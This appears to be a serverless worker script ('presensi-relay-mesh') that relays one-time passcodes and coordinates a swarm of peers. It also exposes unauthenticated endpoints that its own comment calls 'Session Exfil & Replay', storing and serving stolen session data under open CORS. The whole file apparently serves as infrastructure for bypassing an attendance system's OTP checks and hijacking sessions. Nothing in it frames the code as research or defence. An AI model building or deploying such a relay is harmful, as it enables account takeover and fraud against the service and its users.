const TTL = 180; // OTP codes expire after 3 minutes

export default {
  async fetch(request, env) {
    const url    = new URL(request.url);
    const path   = url.pathname;
    const method = request.method.toUpperCase();

    const cors = {
      'Access-Control-Allow-Origin':  '*',
      'Access-Control-Allow-Methods': 'GET, PUT, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    };

    if (method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: cors });
    }

    // ── OTP Endpoints (/otp/:tmKey) ───────────────────────────────────────────
    const otpMatch = path.match(/^\/otp\/([^/]+)$/);
    if (otpMatch) {
      const key = 'otp:' + otpMatch[1];

      if (method === 'PUT' || method === 'POST') {
        let body;
        try { body = await request.json(); } catch (_) { body = {}; }
        const rawCode = body.code || body.otp || '';
        const code = String(rawCode).replace(/\D/g, '').slice(0, 8);
        if (!code) return new Response(JSON.stringify({ error: 'bad code' }), { status: 400, headers: cors });

        const record = { code, otp: code, tmKey: otpMatch[1], ts: Date.now() };
        await env.RELAY.put(key, JSON.stringify(record), { expirationTtl: TTL });
        // Also update latest active OTP in mesh state
        await env.RELAY.put('mesh:latest_otp', JSON.stringify(record), { expirationTtl: TTL });

        return new Response(JSON.stringify({ ok: true, code, otp: code }), {
          headers: { 'Content-Type': 'application/json', ...cors },
        });
      }

      if (method === 'GET') {
        const val = await env.RELAY.get(key);
        if (!val) {
          return new Response(JSON.stringify({ code: null, otp: null }), {
            headers: { 'Content-Type': 'application/json', ...cors },
          });
        }
        return new Response(val, { headers: { 'Content-Type': 'application/json', ...cors } });
      }
    }

    // ── Swarm Mesh Heartbeat & Leader Election (/mesh/heartbeat/:peerId) ──────
    const hbMatch = path.match(/^\/mesh\/heartbeat\/([^/]+)$/);
    if (hbMatch && (method === 'PUT' || method === 'POST')) {
      const peerId = hbMatch[1];
      let body;
      try { body = await request.json(); } catch (_) { body = {}; }

      const now = Date.now();
      let leaderData = null;
      try {
        const raw = await env.RELAY.get('mesh:leader');
        if (raw) leaderData = JSON.parse(raw);
      } catch (_) {}

      let isLeader = false;
      // If leader doesn't exist, is expired (> 25s), or is this peer, assign leadership
      if (!leaderData || (now - (leaderData.ts || 0) > 25000) || leaderData.peerId === peerId) {
        leaderData = { peerId, ts: now };
        await env.RELAY.put('mesh:leader', JSON.stringify(leaderData), { expirationTtl: 30 });
        isLeader = true;
      }

      // Record peer liveness
      await env.RELAY.put('peer:' + peerId, JSON.stringify({ ts: now, isLeader, meta: body }), { expirationTtl: 40 });

      // Return current swarm status + latest known OTP & state
      let latestOtp = null;
      try {
        const rawOtp = await env.RELAY.get('mesh:latest_otp');
        if (rawOtp) latestOtp = JSON.parse(rawOtp);
      } catch (_) {}

      let meshState = null;
      try {
        const rawState = await env.RELAY.get('mesh:state');
        if (rawState) meshState = JSON.parse(rawState);
      } catch (_) {}

      return new Response(JSON.stringify({
        ok: true,
        peerId,
        isLeader,
        leaderId: leaderData.peerId,
        latestOtp,
        meshState
      }), {
        headers: { 'Content-Type': 'application/json', ...cors },
      });
    }

    // ── Swarm Shared State (/mesh/state) ───────────────────────────────────────
    if (path === '/mesh/state') {
      if (method === 'PUT' || method === 'POST') {
        let body;
        try { body = await request.json(); } catch (_) { body = {}; }
        await env.RELAY.put('mesh:state', JSON.stringify({ ...body, ts: Date.now() }), { expirationTtl: 600 });
        return new Response(JSON.stringify({ ok: true }), {
          headers: { 'Content-Type': 'application/json', ...cors },
        });
      }
      if (method === 'GET') {
        const val = await env.RELAY.get('mesh:state');
        return new Response(val || JSON.stringify({ meshState: null }), {
          headers: { 'Content-Type': 'application/json', ...cors },
        });
      }
    }

    // ── Session Exfil & Replay Endpoints (/session) ────────────────────────────
    if (path === '/session' && (method === 'PUT' || method === 'POST')) {
      let body;
      try { body = await request.json(); } catch (_) { body = {}; }
      const key = 'session:' + (body.tmKey || 'shared');
      await env.RELAY.put(key, JSON.stringify({ ...body, ts: Date.now() }), { expirationTtl: 7200 });
      return new Response(JSON.stringify({ ok: true }), {
        headers: { 'Content-Type': 'application/json', ...cors },
      });
    }

    const sessionMatch = path.match(/^\/session\/([^/]+)$/);
    if (sessionMatch && method === 'GET') {
      const val = await env.RELAY.get('session:' + sessionMatch[1]);
      if (!val) return new Response(JSON.stringify({ session: null }), {
        headers: { 'Content-Type': 'application/json', ...cors },
      });
      return new Response(val, { headers: { 'Content-Type': 'application/json', ...cors } });
    }

    return new Response('presensi-relay-mesh-active', { status: 200, headers: cors });
  },
};
